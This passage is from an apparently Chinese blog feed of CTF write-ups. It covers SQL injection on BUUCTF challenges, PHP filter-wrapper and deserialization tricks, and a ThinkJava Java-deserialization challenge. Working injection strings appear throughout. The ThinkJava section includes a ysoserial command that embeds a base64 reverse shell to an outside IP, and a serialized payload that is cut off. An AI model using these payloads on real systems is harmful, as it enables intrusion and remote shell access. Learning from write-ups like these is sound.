class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/13.png" alt="1">flag为<code>flag{1f13cb4b-44b0-49e7-8ca5-02499e7085df}</code></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>堆叠注入</p><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/15.png" alt="1"></p><p>获取<code>flag</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/14.png" alt="1"></p><p>flag为<code>flag{e0fd544e-1ad2-4725-9a41-5de52bc11c9d}</code></p><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><h4 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h4><p>启动靶机，发现需要用户名密码登陆，直接万能密码尝试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' or '1'='1'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/16.png" alt="16"></p><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>接着通过<code>order by</code>爆破列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin' order by 1<span class="comment">#</span></span><br><span class="line">admin' order by 2<span class="comment">#</span></span><br><span class="line">admin' order by 3<span class="comment">#</span></span><br><span class="line">admin' order by 4<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>4的时候报错，说明有3列</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/17.png" alt="17"></p><p>回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/18.png" alt="18"></p><h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>查询数据库和版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/19.png" alt="19"></p><p>查询数据库下的数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/20.png" alt="20"></p><p>查询指定表名下的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'geekuser'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/21.png" alt="21"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'l0ve1ysq1'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/22.png" alt="22"></p><h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><p>查询指定数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到<code>flag</code>为<code>flag{b9c4667a-4a05-441b-b100-a2106627c639}</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;b9c4667a-4a05-441b-b100-a2106627c639&#125;'</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><h4 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h4><p>万能密码失效，对于一些sql关键字进行了过滤</p><p>尝试双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现列数不匹配</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/23.png" alt="23"></p><p>回显爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/24.png" alt="24"></p><p>查询数据库下的数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>报错如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/25.png" alt="25"></p><p>继续双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/26.png" alt="26"></p><p>查询指定表名下的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>上面两张表均没有flag的信息</p><p>猜测存在其他数据库中</p><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><p>获取所有数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到的结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,test,ctf,geek</span><br></pre></td></tr></table></figure><p>猜测<code>ctf</code>数据库中存在<code>flag</code></p><p>查看<code>ctf</code>数据库中的所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'Flag'</span><br></pre></td></tr></table></figure><p>查询Flag表中的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag'</span><br></pre></td></tr></table></figure><h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><p>查询指定数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag&#123;fa4954aa-49af-4e07-adc4-74a1260cbb21&#125;'</span><br></pre></td></tr></table></figure><p><code>flag</code>为<code>flag{fa4954aa-49af-4e07-adc4-74a1260cbb21}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Ctf sql注入学习&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019-Web-逆转思维 WriteUp</title>
    <link href="elssm.github.io/2022/12/06/2019-Web-%E9%80%86%E8%BD%AC%E6%80%9D%E7%BB%B4-WriteUp/"/>
    <id>elssm.github.io/2022/12/06/2019-Web-逆转思维-WriteUp/</id>
    <published>2022-12-06T06:36:29.000Z</published>
    <updated>2022-12-06T06:39:17.328Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>题目地址</p><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><p>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>进入首页<code>php</code>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>get</code>请求接收三个参数，第一个if判断成立可以通过<code>data</code>协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/1.png" alt="1"></p><p>第二个if判断不能包含<code>flag</code>字符，因此我们可以先通过<code>php://filter</code>协议获取<code>useless.php</code>文件源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>得到<code>base64</code>编码文件如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure><p>解密后获取<code>useless.php</code>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于<code>password</code>的传值，通过构造<code>flag.php</code>的序列化，让<code>password</code>等于<code>flag.php</code>的序列化输出就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>最终<code>get</code>请求参数为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/2.png" alt="2"></p><p>flag为<code>ctfhub{19a6a30e7f1e76f5a60dc63c}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;题目地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blan
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ThinkJava CTF WriteUp</title>
    <link href="elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/"/>
    <id>elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/</id>
    <published>2022-12-04T08:22:10.000Z</published>
    <updated>2022-12-04T08:27:17.873Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h4><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>下载文件后idea查看，存在地址/common/test/sqlDict</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/1.png" alt="1"></p><p>sqlDict中存在sql注入</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/2.png" alt="2"></p><p>获取用户名和密码</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/3.png" alt="3"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>代码中发现引入了swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/4.png" alt="4"></p><p>登陆swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/5.png" alt="5"></p><p>存在登陆接口，根据sql注入得到的用户名和密码进行登录</p><p>resp中返回了base64的auth头</p><p>将base64的auth头放入/common/user/current接口中的</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/6.png" alt="6"></p><p>可以得到用户名</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>从rO0AB特征可以看到是java的序列化后的base64编码</p><p>构造反弹shell</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/7.png" alt="7"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % java -jar ysoserial-all.jar ROME "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTg4LjE1OC84MDgwIDA+JjE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;" |base64</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb0yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYGJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVORE11TVRnNExqRTFPQzg0TURnd0lEQStKakV9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyAQAfTHlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AFwAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAA